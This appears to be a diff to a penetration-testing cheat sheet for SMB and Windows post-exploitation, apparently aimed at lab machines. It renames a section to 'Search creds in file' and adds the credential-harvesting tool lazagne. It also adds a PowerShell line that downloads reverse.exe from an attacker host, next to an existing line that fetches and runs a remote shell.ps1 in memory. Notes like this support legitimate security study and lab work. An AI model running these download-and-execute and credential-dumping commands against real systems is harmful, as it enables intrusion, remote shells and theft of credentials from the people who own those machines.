@@ -219,9 +219,10 @@ Retrieve a folder recursively:
 
     smbget -R -U User smb://10.10.10.178/SHARE\$/XXX/
 
-Crawl SMB share
+Search creds in file
 
     snaffler
+    lazagne
 
 
 Display tree
@@ -240,6 +241,7 @@ Connect with smbexec
 
 Running remote script directly
 
+    PS C:> Invoke-WebRequest 'http://10.10.14.15:8000/reverse.exe' -OutFile reverse.exe
     PS C:> IEX (New-Object Net.WebClient).DownloadString(‘https://10.10.14.8/shell.ps1’)
 
 Run WinRM commands from powershell:
